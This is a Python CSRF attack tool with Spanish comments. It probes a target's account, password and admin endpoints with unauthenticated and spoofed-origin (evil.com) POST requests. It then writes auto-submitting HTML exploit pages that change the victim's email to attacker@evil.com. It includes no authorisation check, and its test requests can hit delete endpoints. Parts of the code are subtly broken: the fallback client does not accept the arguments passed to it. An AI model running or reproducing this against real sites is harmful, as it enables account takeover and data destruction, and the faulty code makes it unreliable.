#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
CSRF TESTER v2.0 - TANQUE EDITION
Cross-Site Request Forgery · Token analysis · SameSite · Origin checks
Con generación de PoC
"""

import asyncio
import random
import re
from urllib.parse import urlparse, urljoin
from typing import Dict, List, Optional

try:
    from http_client import HTTPClient
except ImportError:
    class HTTPClient:
        async def __aenter__(self): return self
        async def __aexit__(self, *args): pass
        async def get(self, url): return None
        async def post(self, url, data=None): return None

class CSRFtester:
    def __init__(self, url: str, aggressive: bool = False):
        self.url = url.rstrip('/')
        self.parsed = urlparse(url)
        self.domain = self.parsed.netloc
        self.aggressive = aggressive
        self.client = None
        self.findings = []
        
        # Endpoints con acciones
        self.action_endpoints = [
            '/user/update', '/profile/edit', '/account/change',
            '/settings', '/password/change', '/email/change',
            '/user/delete', '/post/create', '/post/delete',
            '/admin/user/add', '/admin/user/delete', '/api/user',
            '/api/settings', '/api/password', '/api/email',
        ]
        
        # Patrones de CSRF tokens
        self.token_patterns = [
            r'csrf[_\-]?token["\']?\s*[:=]\s*["\']([^"\']+)["\']',
            r' authenticity_token["\']?\s*[:=]\s*["\']([^"\']+)["\']',
            r' _token["\']?\s*[:=]\s*["\']([^"\']+)["\']',
            r' token["\']?\s*[:=]\s*["\']([^"\']+)["\']',
            r' xsrf[_\-]?token["\']?\s*[:=]\s*["\']([^"\']+)["\']',
            r' __RequestVerificationToken["\']?\s*[:=]\s*["\']([^"\']+)["\']',
        ]
        
        # SameSite values
        self.samesite_values = ['Strict', 'Lax', 'None']
        
    async def setup(self):
        """Inicializa cliente HTTP"""
        self.client = HTTPClient(timeout=15, max_retries=2)
        
    async def check_csrf_token(self, url: str) -> Dict:
        """Verifica si un endpoint tiene CSRF token"""
        try:
            # GET para obtener formulario
            resp = await self.client.get(url)
            if not resp:
                return {'has_token': False, 'reason': 'No response'}
                
            html = await resp.text()
            cookies = resp.headers.get('set-cookie', '')
            
            # Buscar token en HTML
            tokens = []
            for pattern in self.token_patterns:
                matches = re.findall(pattern, html, re.IGNORECASE)
                tokens.extend(matches)
                
            # Verificar SameSite en cookies
            samesite = None
            for value in self.samesite_values:
                if f'SameSite={value}' in cookies:
                    samesite = value
                    break
                    
            return {
                'has_token': len(tokens) > 0,
                'tokens': tokens[:3],
                'samesite': samesite,
                'cookies': cookies[:200] if cookies else ''
            }
            
        except Exception as e:
            return {'has_token': False, 'error': str(e)}
            
    async def test_csrf(self, endpoint: str) -> Optional[Dict]:
        """Prueba CSRF en un endpoint"""
        url = urljoin(self.url, endpoint)
        
        # 1. Verificar token
        token_check = await self.check_csrf_token(url)
        
        # 2. Probar POST sin token
        try:
            # Sin token
            resp1 = await self.client.post(url, data={'test': 'data'})
            
            # Con Origin/Referer diferente
            headers = {
                'Origin': 'https://evil.com',
                'Referer': 'https://evil.com/csrf.html'
            }
            resp2 = await self.client.post(url, data={'test': 'data'}, headers=headers)
            
            issues = []
            
            # Analizar resultados
            if resp1 and resp1.status == 200:
                issues.append('Acepta POST sin token')
                
            if resp2 and resp2.status == 200:
                issues.append('Acepta POST desde origen externo')
                
            if not token_check.get('has_token'):
                issues.append('No tiene CSRF token visible')
                
            if token_check.get('samesite') == 'None':
                issues.append('SameSite=None en cookies')
            elif not token_check.get('samesite'):
                issues.append('Sin SameSite en cookies')
                
            if issues:
                severity = 'CRITICO' if len(issues) > 1 else 'ALTO'
                return {
                    'type': 'CSRF_VULNERABLE',
                    'endpoint': endpoint,
                    'url': url,
                    'issues': issues,
                    'token_info': token_check,
                    'severity': severity
                }
                
        except Exception as e:
            pass
            
        return None
        
    async def generate_poc(self, endpoint: str) -> str:
        """Genera PoC HTML para CSRF"""
        return f'''<!DOCTYPE html>
<html>
<head>
    <title>CSRF PoC - {endpoint}</title>
</head>
<body>
    <h1>CSRF Proof of Concept</h1>
    <p>Este formulario se enviará automáticamente a {endpoint}</p>
    
    <form id="csrf-form" action="{urljoin(self.url, endpoint)}" method="POST">
        <input type="hidden" name="email" value="attacker@evil.com" />
        <input type="hidden" name="action" value="change" />
        <!-- Añadir más campos según sea necesario -->
    </form>
    
    <script>
        // Auto-submit
        document.getElementById('csrf-form').submit();
    </script>
    
    <h3>Si ves este mensaje, el ataque CSRF se ha ejecutado.</h3>
</body>
</html>'''
        
    async def scan(self):
        """Ejecuta escaneo CSRF"""
        print(f"\n🔄 CSRF TESTER v2.0 TANQUE - {self.url}")
        print("=" * 70)
        
        await self.setup()
        
        try:
            print(f"[*] Probando {len(self.action_endpoints)} endpoints sensibles")
            print("-" * 70)
            
            for endpoint in self.action_endpoints:
                print(f"\n[*] Probando: {endpoint}")
                
                result = await self.test_csrf(endpoint)
                
                if result:
                    self.findings.append(result)
                    print(f"   [[CRITICO]] CSRF VULNERABLE")
                    for issue in result['issues']:
                        print(f"        ↳ {issue}")
                        
                    # Generar PoC
                    poc = await self.generate_poc(endpoint)
                    with open(f"csrf_poc_{self.domain}.html", 'a') as f:
                        f.write(poc)
                        
                await asyncio.sleep(random.uniform(0.3, 0.7))
                
            # Resumen
            print("\n" + "="*70)
            print("📊 RESULTADOS CSRF")
            print("="*70)
            
            if self.findings:
                print(f"\n[CRITICO] VULNERABILIDADES CSRF: {len(self.findings)}")
                for f in self.findings:
                    print(f"   • {f['endpoint']}")
                    for issue in f['issues']:
                        print(f"        ↳ {issue}")
                        
                print(f"\n💾 PoC guardado en csrf_poc_{self.domain}.html")
            else:
                print("\n[OK] No se detectaron vulnerabilidades CSRF")
                
        finally:
            if self.client:
                await self.client.close()
                
        return self.findings

async def main():
    import sys
    if len(sys.argv) < 2:
        print("Uso: python3 csrf_tester.py <URL> [--aggressive]")
        sys.exit(1)
        
    url = sys.argv[1]
    aggressive = '--aggressive' in sys.argv
    
    tester = CSRFtester(url, aggressive)
    await tester.scan()

if __name__ == "__main__":
    asyncio.run(main())
